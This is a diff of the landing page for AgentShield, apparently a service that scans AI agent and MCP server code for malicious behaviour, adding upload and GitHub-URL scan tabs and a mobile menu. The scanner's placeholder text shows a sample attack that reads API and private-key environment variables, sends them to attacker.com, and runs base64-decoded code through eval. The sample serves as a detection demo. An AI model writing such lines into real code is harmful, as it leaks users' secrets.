@@ -10,7 +10,7 @@
     <meta property="og:title" content="AgentShield - The Immune System for AI Agents">
     <meta property="og:description" content="33% of MCP servers have critical vulnerabilities. Scan yours free.">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://agentshield.dev">
+    <meta property="og:url" content="https://agent-shield-ai.github.io/agentshield/">
     
     <!-- Twitter -->
     <meta name="twitter:card" content="summary_large_image">
@@ -198,6 +198,36 @@
         .nav-cta:hover {
             transform: translateY(-1px);
             box-shadow: 0 4px 20px rgba(var(--primary-rgb), 0.4);
+        }
+        
+        .mobile-menu-btn {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+        }
+        
+        .mobile-menu-btn span {
+            width: 24px;
+            height: 2px;
+            background: var(--text);
+            border-radius: 2px;
+            transition: all 0.3s;
+        }
+        
+        .mobile-menu-btn.active span:nth-child(1) {
+            transform: rotate(45deg) translate(5px, 5px);
+        }
+        
+        .mobile-menu-btn.active span:nth-child(2) {
+            opacity: 0;
+        }
+        
+        .mobile-menu-btn.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(5px, -5px);
         }
         
         /* Hero Section */
@@ -659,6 +689,80 @@
         }
         
         .code-textarea::placeholder {
+            color: var(--text-muted);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .upload-zone {
+            border: 2px dashed var(--border);
+            border-radius: 12px;
+            padding: 60px 40px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            min-height: 250px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .upload-zone:hover, .upload-zone.dragover {
+            border-color: var(--primary);
+            background: rgba(var(--primary-rgb), 0.05);
+        }
+        
+        .upload-icon {
+            font-size: 3rem;
+            margin-bottom: 16px;
+        }
+        
+        .upload-text {
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+        }
+        
+        .upload-link {
+            color: var(--primary);
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        
+        .upload-hint {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+        
+        .github-input-wrapper {
+            padding: 40px 20px;
+            text-align: center;
+        }
+        
+        .github-url-input {
+            width: 100%;
+            max-width: 600px;
+            padding: 16px 20px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text);
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .github-url-input:focus {
+            border-color: rgba(var(--primary-rgb), 0.5);
+        }
+        
+        .github-url-input::placeholder {
             color: var(--text-muted);
         }
         
@@ -1177,6 +1281,23 @@
                 display: none;
             }
             
+            .mobile-menu-btn {
+                display: flex;
+            }
+            
+            .nav-links.mobile-open {
+                display: flex;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                flex-direction: column;
+                background: rgba(8, 8, 12, 0.98);
+                padding: 20px;
+                gap: 16px;
+                border-bottom: 1px solid var(--border);
+            }
+            
             .cta-buttons {
                 flex-direction: column;
             }
@@ -1201,17 +1322,22 @@
     <header>
         <div class="container">
             <nav>
-                <a href="#" class="logo">
+                <a href="./" class="logo">
                     <div class="logo-icon">🛡️</div>
                     <div class="logo-text">Agent<span>Shield</span></div>
                 </a>
-                <div class="nav-links">
+                <div class="nav-links" id="navLinks">
                     <a href="#scanner">Scanner</a>
                     <a href="#features">Features</a>
                     <a href="#pricing">Pricing</a>
-                    <a href="https://github.com/Agent-Shield-AI/agentshield">GitHub</a>
+                    <a href="https://github.com/Agent-Shield-AI/agentshield" target="_blank">GitHub</a>
                     <a href="#scanner" class="nav-cta">Try Free →</a>
                 </div>
+                <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
             </nav>
         </div>
     </header>
@@ -1396,19 +1522,42 @@
             
             <div class="live-scanner">
                 <div class="scanner-tabs">
-                    <div class="scanner-tab active">📝 Paste Code</div>
-                    <div class="scanner-tab">📁 Upload File</div>
-                    <div class="scanner-tab">🔗 GitHub URL</div>
+                    <div class="scanner-tab active" data-tab="paste" onclick="switchTab('paste')">📝 Paste Code</div>
+                    <div class="scanner-tab" data-tab="upload" onclick="switchTab('upload')">📁 Upload File</div>
+                    <div class="scanner-tab" data-tab="github" onclick="switchTab('github')">🔗 GitHub URL</div>
                 </div>
                 
                 <div class="scanner-input-area">
-                    <textarea class="code-textarea" id="codeInput" placeholder="// Paste suspicious code here to scan...
+                    <!-- Paste Code Tab -->
+                    <div class="tab-content active" id="tab-paste">
+                        <textarea class="code-textarea" id="codeInput" placeholder="// Paste suspicious code here to scan...
 
 // Example malicious code:
 const secret = process.env.API_KEY;
 const wallet = process.env.PRIVATE_KEY;
 fetch('https://attacker.com/steal?key=' + secret);
 eval(atob('bWFsaWNpb3VzX2NvZGU='));"></textarea>
+                    </div>
+                    
+                    <!-- Upload File Tab -->
+                    <div class="tab-content" id="tab-upload">
+                        <div class="upload-zone" id="uploadZone">
+                            <input type="file" id="fileInput" accept=".js,.ts,.py,.json,.md,.txt,.mjs,.cjs" hidden>
+                            <div class="upload-icon">📁</div>
+                            <p class="upload-text">Drag & drop files here or <span class="upload-link">browse</span></p>
+                            <p class="upload-hint">.js, .ts, .py, .json, .md files supported</p>
+                        </div>
+                    </div>
+                    
+                    <!-- GitHub URL Tab -->
+                    <div class="tab-content" id="tab-github">
+                        <div class="github-input-wrapper">
+                            <input type="url" id="githubUrl" class="github-url-input" placeholder="https://github.com/username/repo or paste raw file URL">
+                            <button class="btn btn-secondary" onclick="fetchGitHub()" style="margin-top: 16px;">
+                                🔍 Fetch & Scan
+                            </button>
+                        </div>
+                    </div>
                 </div>
                 
                 <div class="scanner-actions">
@@ -1585,7 +1734,7 @@ eval(atob('bWFsaWNpb3VzX2NvZGU='));"></textarea>
                         <li><span class="check">✓</span> Priority support</li>
                     </ul>
                     
-                    <a href="#" class="btn btn-primary">Start Free Trial</a>
+                    <a href="#scanner" class="btn btn-primary">Start Free Trial</a>
                 </div>
                 
                 <div class="pricing-card">
@@ -1609,7 +1758,7 @@ eval(atob('bWFsaWNpb3VzX2NvZGU='));"></textarea>
                         <li><span class="check">✓</span> Dedicated support</li>
                     </ul>
                     
-                    <a href="mailto:enterprise@agentshield.dev" class="btn btn-secondary">Contact Sales</a>
+                    <a href="https://github.com/Agent-Shield-AI/agentshield/issues/new?title=Enterprise%20Inquiry&labels=enterprise" class="btn btn-secondary" target="_blank">Contact Sales</a>
                 </div>
             </div>
         </div>
@@ -1639,11 +1788,11 @@ eval(atob('bWFsaWNpb3VzX2NvZGU='));"></textarea>
             <div class="footer-content">
                 <p class="footer-copy">© 2026 AgentShield. Protecting the AI economy.</p>
                 <div class="footer-links">
-                    <a href="#">Documentation</a>
-                    <a href="#">Privacy</a>
-                    <a href="#">Terms</a>
-                    <a href="https://github.com/Agent-Shield-AI/agentshield">GitHub</a>
-                    <a href="#">Twitter</a>
+                    <a href="https://github.com/Agent-Shield-AI/agentshield#readme" target="_blank">Documentation</a>
+                    <a href="https://github.com/Agent-Shield-AI/agentshield/blob/main/PRIVACY.md" target="_blank">Privacy</a>
+                    <a href="https://github.com/Agent-Shield-AI/agentshield/blob/main/LICENSE" target="_blank">License</a>
+                    <a href="https://github.com/Agent-Shield-AI/agentshield" target="_blank">GitHub</a>
+                    <a href="https://twitter.com/agentshield_ai" target="_blank">Twitter</a>
                 </div>
             </div>
         </div>
@@ -1828,6 +1977,105 @@ eval(atob('bWFsaWNpb3VzX2NvZGU='));"></textarea>
         document.getElementById('codeInput').addEventListener('keydown', (e) => {
             if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) {
                 performScan();
+            }
+        });
+
+        // Tab switching
+        function switchTab(tab) {
+            // Update tab buttons
+            document.querySelectorAll('.scanner-tab').forEach(t => {
+                t.classList.toggle('active', t.dataset.tab === tab);
+            });
+            // Update tab content
+            document.querySelectorAll('.tab-content').forEach(c => {
+                c.classList.toggle('active', c.id === 'tab-' + tab);
+            });
+        }
+
+        // Mobile menu toggle
+        document.getElementById('mobileMenuBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+            document.getElementById('navLinks').classList.toggle('mobile-open');
+        });
+
+        // Close mobile menu when clicking a link
+        document.querySelectorAll('.nav-links a').forEach(link => {
+            link.addEventListener('click', () => {
+                document.getElementById('mobileMenuBtn').classList.remove('active');
+                document.getElementById('navLinks').classList.remove('mobile-open');
+            });
+        });
+
+        // File upload handling
+        const uploadZone = document.getElementById('uploadZone');
+        const fileInput = document.getElementById('fileInput');
+
+        uploadZone.addEventListener('click', () => fileInput.click());
+        
+        uploadZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadZone.classList.add('dragover');
+        });
+        
+        uploadZone.addEventListener('dragleave', () => {
+            uploadZone.classList.remove('dragover');
+        });
+        
+        uploadZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadZone.classList.remove('dragover');
+            const file = e.dataTransfer.files[0];
+            if (file) processFile(file);
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) processFile(file);
+        });
+
+        function processFile(file) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                document.getElementById('codeInput').value = e.target.result;
+                switchTab('paste');
+                performScan();
+            };
+            reader.readAsText(file);
+        }
+
+        // GitHub URL fetching
+        async function fetchGitHub() {
+            const urlInput = document.getElementById('githubUrl');
+            let url = urlInput.value.trim();
+            
+            if (!url) {
+                alert('Please enter a GitHub URL');
+                return;
+            }
+
+            // Convert github.com URLs to raw URLs
+            if (url.includes('github.com') && !url.includes('raw.githubusercontent.com')) {
+                url = url
+                    .replace('github.com', 'raw.githubusercontent.com')
+                    .replace('/blob/', '/');
+            }
+
+            try {
+                const resp = await fetch(url);
+                if (!resp.ok) throw new Error('Failed to fetch');
+                const code = await resp.text();
+                document.getElementById('codeInput').value = code;
+                switchTab('paste');
+                performScan();
+            } catch (err) {
+                alert('Could not fetch file. Make sure the URL is correct and publicly accessible.');
+            }
+        }
+
+        // Allow Enter key in GitHub URL input
+        document.getElementById('githubUrl').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                fetchGitHub();
             }
         });
     </script>
